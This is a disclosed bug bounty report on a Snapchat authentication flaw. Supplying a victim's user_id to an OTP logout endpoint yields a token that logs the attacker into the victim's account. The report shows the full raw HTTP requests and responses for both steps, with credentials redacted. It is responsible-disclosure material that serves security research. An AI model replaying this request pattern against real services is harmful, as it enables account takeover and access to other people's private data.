# Improper Authentication - any user can login as other user with otp/logout & otp/login

## Report Details
- **Report ID**: 921780
- **URL**: https://hackerone.com/reports/921780
- **State**: Closed
- **Severity**: critical
- **Submitted**: 2020-07-13T02:18:38.031Z
- **Disclosed**: 2021-09-03T09:12:24.380Z

## Reporter
- **Username**: korniltsev
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: snapchat

## Vulnerability Information
'/scauth/otp/droid/logout' request contains user_id parameter. Usually it is equal to current user user_id, but if an attacker passes user_id of victim account he can login as victim.

I will demonstrate the problem on two accounts.
Victim: ███
Attacker: ██████████


-  Attacker perform a usuall login to attacker's personal account.
-  Attacker performs `/scauth/otp/droid/logout` but instead of attacker's user_id, attacker provides victim's user_id
request

```
POST /scauth/otp/droid/logout HTTP/1.1
Host: gcp.api.snapchat.com
Connection: close
Content-Length: 168
X-Snapchat-Client-Auth: ██████
X-Snapchat-UUID: ███
x-snapchat-userid: █████
username: ███
req_token: █████████
timestamp: 1594604280000
Accept: application/json
User-Agent: Snapchat/10.78.1.0 █████
Accept-Language: en-GB;q=1, en;q=0.9
Content-Type: application/json; charset=utf-8
Accept-Encoding: gzip, deflate

{"user_id":"████","device_id":"███████","device_name":"███████"}
```

 response

```
HTTP/1.1 200 OK
date: Mon, 13 Jul 2020 01:39:18 GMT
content-type: application/json;charset=utf-8
vary: Accept-Encoding
x-cloud-trace-context: 4ea579062bff12ec2ef2162a59116f2e
server: API Gateway
cache-control: no-cache, no-store
x-snapchat-notice: Snapchat Private APIs - Unauthorized use is prohibited.
x-snapchat-request-id: █████
x-snapchat-server-latency: 342
strict-transport-security: max-age=31536000; includeSubDomains
Via: 1.1 google, 1.1 google
Alt-Svc: h3-Q050=":443"; ma=2592000,h3-Q046=":443"; ma=2592000,h3-Q043=":443"; ma=2592000,quic=":443"; ma=2592000; v="46,43"
Connection: close
Content-Length: 137

{"status":"SUCCESS","user_id":"█████████","token":"█████","expiry_hint":████}
```
Notice an attacker replaced user_id with victim's user_id and the server responded with victim's user_id and given us otp token. Now let's login with the token.

-  Attacker performs `/scauth/otp/login` request with username equal victim's username, and the token obtained on previous step.

```
POST /scauth/otp/login HTTP/1.1
Host: gcp.api.snapchat.com
Connection: close
Content-Length: 6213
X-Snapchat-Client-Auth: ██████
X-Snapchat-UUID: ████████
User-Agent: Snapchat/10.78.1.0 ██████
Accept: application/json
Accept-Language: en-GB;q=1, en;q=0.9
Content-Type: application/x-www-form-urlencoded; charset=utf-8
Accept-Encoding: gzip, deflate

application_id=com.snap.framework&attestation=████████&device_id=█████████&dsig=█████&dtoken1i=██████&fidelius_client_init=███████&height=1920&max_video_height=1920&max_video_width=1080&password=███████&reactivation_confirmed=false&req_token=████████&screen_height_in=4.527565&screen_height_px=1920&screen_width_in=2.5590599&screen_width_px=1080&timestamp=1594604398438&token=████&username=█████&width=1080
```

response

```
HTTP/1.1 200 OK
date: Mon, 13 Jul 2020 01:40:18 GMT
content-type: application/json;charset=utf-8
vary: Accept-Encoding,Accept-Encoding
x-cloud-trace-context: f88a46255f8542b12008295d77cf1b5c
server: API Gateway
cache-control: no-cache, no-store
x-snap-refresh-token: ████
x-snapchat-notice: Snapchat Private APIs - Unauthorized use is prohibited.
x-snap-access-tokens: ███
x-snapchat-request-id: ████████
strict-transport-security: max-age=31536000; includeSubDomains
Via: 1.1 google, 1.1 google
Alt-Svc: h3-Q050=":443"; ma=2592000,h3-Q046=":443"; ma=2592000,h3-Q043=":443"; ma=2592000,quic=":443"; ma=2592000; v="46,43"
Connection: close
Content-Length: 138867

{"updates_response":{"logged":true,"username":"█████","user_id":"█████",...
```
An attacker successfully performed login as victim.

Victim's user_id can be easily obtained with friends request.

I've attached the following:
- a screencast to showcase the problem.
- burp project ████
- logout+login raw requests exported from burp
- a python script to perform the attack

I've tested this bug only on my personal accounts.
███████
███
█████████

## Impact

An attacker is able to  login as any user.

## Attachments
No attachments
